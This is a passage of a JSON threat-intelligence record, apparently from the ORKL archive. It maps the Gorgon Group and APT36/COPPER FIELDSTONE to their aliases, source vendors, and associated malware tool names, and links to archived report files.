                "ZPAQ",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "66fc98f4-8978-401e-9b73-81c3d5f1e44c",
            "created_at": "2024-05-01T02:03:08.050109Z",
            "updated_at": "2025-03-27T02:05:17.327953Z",
            "deleted_at": null,
            "main_name": "COPPER FIELDSTONE",
            "aliases": [
                "Gorgon Group",
                "Green Havildar ",
                "Mythic Leopard ",
                "Operation C-Major ",
                "Operation Transparent Tribe ",
                "Pasty Draco ",
                "ProjectM ",
                "Storm-0156 ",
                "APT36 "
            ],
            "source_name": "Secureworks:COPPER FIELDSTONE",
            "tools": [
                " DarkComet",
                " LuminosityLink",
                " Peppy",
                " njRAT",
                "Crimson RAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "18278778-fa63-4a9a-8988-4d266b8c5c1a",
            "created_at": "2023-01-06T13:46:38.769816Z",
            "updated_at": "2025-03-27T02:00:02.914024Z",
            "deleted_at": null,
            "main_name": "The Gorgon Group",
            "aliases": [
                "ATK92",
                "G0078",
                "Pasty Gemini",
                "Gorgon Group",
                "Subaat"
            ],
            "source_name": "MISPGALAXY:The Gorgon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "97fdaf9f-cae1-4ccc-abe2-76e5cbc0febd",
            "created_at": "2022-10-25T15:50:23.296989Z",
            "updated_at": "2025-03-27T02:00:55.432751Z",
            "deleted_at": null,
            "main_name": "Gorgon Group",
            "aliases": [
                "Gorgon Group"
            ],
            "source_name": "MITRE:Gorgon Group",
            "tools": [
                "NanoCore",
                "QuasarRAT",
                "Remcos",
                "njRAT"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536144,
    "ts_updated_at": 1743041706,
    "ts_creation_date": 1653752605,
    "ts_modification_date": 1653752605,
    "files": {
        "pdf": "https://archive.orkl.eu/d49c695cb892eaf1735b48a96145d668016c2f01.pdf",
        "text": "https://archive.orkl.eu/d49c695cb892eaf1735b48a96145d668016c2f01.txt",
        "img": "https://archive.orkl.eu/d49c695cb892eaf1735b48a96145d668016c2f01.jpg"
    }
}